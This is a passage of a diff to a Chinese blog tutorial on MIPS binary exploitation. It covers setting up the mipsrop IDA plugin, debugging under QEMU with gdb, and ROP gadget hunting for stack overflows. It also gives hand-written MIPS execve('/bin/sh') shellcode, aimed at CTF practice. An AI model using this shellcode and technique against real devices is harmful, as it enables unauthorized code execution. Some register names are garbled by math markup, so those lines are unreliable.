-<h5 id="4-安装IDA插件mipsrop"><a href="#4-安装IDA插件mipsrop" class="headerlink" title="4.安装IDA插件mipsrop"></a>4.安装IDA插件mipsrop</h5><p>这里我用的是吾爱的IDA_Pro_v8.3_Portable，其他版本情况可能会有不同。</p>
+<h5 id="安装ida插件mipsrop">4.安装IDA插件mipsrop</h5>
+<p>这里我用的是吾爱的IDA_Pro_v8.3_Portable，其他版本情况可能会有不同。</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/devttys0/ida.git ida-plugins</span><br></pre></td></tr></table></figure></div>
-<p>mipsrop.py在 ida-plugins/plugins/mipsrop目录下，将其复制进IDA的plugins目录即可</p>
+<p>mipsrop.py在
+ida-plugins/plugins/mipsrop目录下，将其复制进IDA的plugins目录即可</p>
 <p><strong>可能遇到的问题</strong></p>
 <img  
                      lazyload
@@ -1098,29 +1147,35 @@
                       class=""
                 >
 <p>在ida-plugins/plugins目录下还有个shims文件夹，将其也复制到IDA的plugins目录就行。</p>
-<h5 id="5-调试方法"><a href="#5-调试方法" class="headerlink" title="5.调试方法"></a>5.调试方法</h5><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel-static -g 6666 -L ./ ./program		<span class="comment">#开的端口是6666</span></span><br></pre></td></tr></table></figure></div>
+<h5 id="调试方法">5.调试方法</h5>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel-static -g 6666 -L ./ ./program		<span class="comment">#开的端口是6666</span></span><br></pre></td></tr></table></figure></div>
 <p>之后用gdb连接</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch program</span><br><span class="line">pwndbg&gt; target remote 127.0.0.1:6666</span><br></pre></td></tr></table></figure></div>
 <p>在python写pwn利用脚本过程中，可以在在process中指定打开的端口，然后附加到gdb时就可以连接。</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">programe = <span class="string">&#x27;your_program&#x27;</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel-static&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;6666&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, program])</span><br><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    file <span class="subst">&#123;program&#125;</span></span></span><br><span class="line"><span class="string">    target remote 127.0.0.1:6666</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
-<h4 id="三、mips的一些栈上漏洞利用"><a href="#三、mips的一些栈上漏洞利用" class="headerlink" title="三、mips的一些栈上漏洞利用"></a>三、mips的一些栈上漏洞利用</h4><p>这里以32位的mips（o32 ABI）为例，其余原理相同。</p>
-<h5 id="1-栈溢出-syscall"><a href="#1-栈溢出-syscall" class="headerlink" title="1.栈溢出+syscall"></a>1.栈溢出+syscall</h5><p>如果一个函数是非叶子函数，则其返回地址也会出现在栈上，最后会读取该地址并返回，类似于x86架构，那我们就可以覆盖返回地址实现ROP，mips架构中比较麻烦的是寻找gadget，这里我们用的是IDA的mipsrop插件。</p>
+<h4 id="三mips的一些栈上漏洞利用">三、mips的一些栈上漏洞利用</h4>
+<p>这里以32位的mips（o32 ABI）为例，其余原理相同。</p>
+<h5 id="栈溢出syscall">1.栈溢出+syscall</h5>
+<p>如果一个函数是非叶子函数，则其返回地址也会出现在栈上，最后会读取该地址并返回，类似于x86架构，那我们就可以覆盖返回地址实现ROP，mips架构中比较麻烦的是寻找gadget，这里我们用的是IDA的mipsrop插件。</p>
 <p>由于mips架构是没有NX保护的，其实我们可以把shellcode写到栈上后想办法跳转到shellcode处执行。</p>
-<p>我们可以先用<code>mipsrop.stackfinders()</code>这个方法来获取能把栈相关地址写到某个寄存器的gadget，然后定位到control jump中为jalr $fp的那个，因为$fp也是一个栈相关的地址，正好位于返回地址向低地址偏移4字节处，如果能栈溢出的话也能进行控制$fp位置的内容。</p>
+<p>我们可以先用<code>mipsrop.stackfinders()</code>这个方法来获取能把栈相关地址写到某个寄存器的gadget，然后定位到control
+jump中为jalr <span
+class="math inline">\(fp的那个，因为\)</span>fp也是一个栈相关的地址，正好位于返回地址向低地址偏移4字节处，如果能栈溢出的话也能进行控制$fp位置的内容。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/09/21/mips-pwn/image-20240921180732229.png"
                       class=""
                 >
-<p>然后既然能控制$a2寄存器的值为一个栈上的可控地址，那么只要我们再找到一个能跳转到$a2的gadget，将其写入$fp的位置处，就能实现ret2syscall。<code>move $t9,reg</code>后面一般都会找到对应的跳转语句。</p>
+<p>然后既然能控制<span
+class="math inline">\(a2寄存器的值为一个栈上的可控地址，那么只要我们再找到一个能跳转到\)</span>a2的gadget，将其写入$fp的位置处，就能实现ret2syscall。<code>move $t9,reg</code>后面一般都会找到对应的跳转语句。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/09/21/mips-pwn/image-20240921180805478.png"
                       class=""
                 >
-<p>之后就可以手搓execve系统调用的shellcode了，系统调用号可以在<a class="link"   target="_blank" rel="noopener" href="https://syscalls.w3challs.com/?arch=mips_o32这查，v0存系统调用号，a0，a1，a2分别存三个参数，可以通过将字符串写到栈顶，在把参数指向$sp，就能实现字符参数的传递了。" >https://syscalls.w3challs.com/?arch=mips_o32这查，v0存系统调用号，a0，a1，a2分别存三个参数，可以通过将字符串写到栈顶，在把参数指向$sp，就能实现字符参数的传递了。<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>之后就可以手搓execve系统调用的shellcode了，系统调用号可以在https://syscalls.w3challs.com/?arch=mips_o32这查，v0存系统调用号，a0，a1，a2分别存三个参数，可以通过将字符串写到栈顶，在把参数指向$sp，就能实现字符参数的传递了。</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">li $v0,0xfab		</span></span><br><span class="line"><span class="string">li $t0,0x0068732f</span></span><br><span class="line"><span class="string">li $t1,0x6e69622f</span></span><br><span class="line"><span class="string">addi $sp,$sp,-4</span></span><br><span class="line"><span class="string">sw $t0, 0($sp)</span></span><br><span class="line"><span class="string">addi $sp,$sp,-4</span></span><br><span class="line"><span class="string">sw $t1, 0($sp)</span></span><br><span class="line"><span class="string">or $a0,$sp,$zero</span></span><br><span class="line"><span class="string">or $a1,$zero,$zero</span></span><br><span class="line"><span class="string">or $a2,$zero,$zero</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>
 <p>这里需要注意的一点是execve的第一个参数最好是/bin/sh，如果图方便只传进去一个sh，因为后面的环境变量参数置零了，很可能会找不到sh报警告，继续向下执行。</p>
 <img  
@@ -1129,7 +1184,9 @@
                      data-src="/blog/2024/09/21/mips-pwn/image-20240921180832554.png"
                       class=""
                 >
-<h4 id="四、题目复现"><a href="#四、题目复现" class="headerlink" title="四、题目复现"></a>四、题目复现</h4><h5 id="xyctf2024-Ez1-0"><a href="#xyctf2024-Ez1-0" class="headerlink" title="[xyctf2024]Ez1.0"></a>[xyctf2024]Ez1.0</h5><img  
+<h4 id="四题目复现">四、题目复现</h4>
+<h5 id="xyctf2024ez1.0">[xyctf2024]Ez1.0</h5>
+<img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/09/21/mips-pwn/image-20240921180859013.png"
@@ -1259,7 +1316,7 @@
 	<div class="post-toc">
 		<div class="toc-title">目录</div>
 		<div class="page-title">mips_pwn</div>
-		<ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E3%80%81mips%E6%9E%B6%E6%9E%84%E6%A6%82%E8%BF%B0"><span class="nav-text">一、mips架构概述</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-text">1.寄存器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E7%89%B9%E5%BE%81"><span class="nav-text">2.特征</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E6%8C%87%E4%BB%A4%E6%A0%BC%E5%BC%8F"><span class="nav-text">3.指令格式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="nav-text">4.常用指令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-MIPS%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84"><span class="nav-text">5.MIPS栈帧结构</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E3%80%81mips%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">二、mips环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%AE%89%E8%A3%85qemu"><span class="nav-text">1.安装qemu</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E5%AE%89%E8%A3%85gdb-multiarch"><span class="nav-text">2.安装gdb-multiarch</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E5%AE%89%E8%A3%85ghidra"><span class="nav-text">3.安装ghidra</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-%E5%AE%89%E8%A3%85IDA%E6%8F%92%E4%BB%B6mipsrop"><span class="nav-text">4.安装IDA插件mipsrop</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95"><span class="nav-text">5.调试方法</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89%E3%80%81mips%E7%9A%84%E4%B8%80%E4%BA%9B%E6%A0%88%E4%B8%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">三、mips的一些栈上漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E6%A0%88%E6%BA%A2%E5%87%BA-syscall"><span class="nav-text">1.栈溢出+syscall</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0"><span class="nav-text">四、题目复现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#xyctf2024-Ez1-0"><span class="nav-text">[xyctf2024]Ez1.0</span></a></li></ol></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80mips%E6%9E%B6%E6%9E%84%E6%A6%82%E8%BF%B0"><span class="nav-text">一、mips架构概述</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-text">1.寄存器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%89%B9%E5%BE%81"><span class="nav-text">2.特征</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8C%87%E4%BB%A4%E6%A0%BC%E5%BC%8F"><span class="nav-text">3.指令格式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="nav-text">4.常用指令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mips%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84"><span class="nav-text">5.MIPS栈帧结构</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8Cmips%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">二、mips环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%89%E8%A3%85qemu"><span class="nav-text">1.安装qemu</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%89%E8%A3%85gdb-multiarch"><span class="nav-text">2.安装gdb-multiarch</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%89%E8%A3%85ghidra"><span class="nav-text">3.安装ghidra</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%89%E8%A3%85ida%E6%8F%92%E4%BB%B6mipsrop"><span class="nav-text">4.安装IDA插件mipsrop</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95"><span class="nav-text">5.调试方法</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89mips%E7%9A%84%E4%B8%80%E4%BA%9B%E6%A0%88%E4%B8%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">三、mips的一些栈上漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BAsyscall"><span class="nav-text">1.栈溢出+syscall</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0"><span class="nav-text">四、题目复现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#xyctf2024ez1.0"><span class="nav-text">[xyctf2024]Ez1.0</span></a></li></ol></li></ol>
 
 	</div>
 </div>
@@ -1290,7 +1347,7 @@
                     </span>
                     
                         <span>
-                            共 120k 字
+                            共 118.7k 字
                         </span>
                     
                 </p>
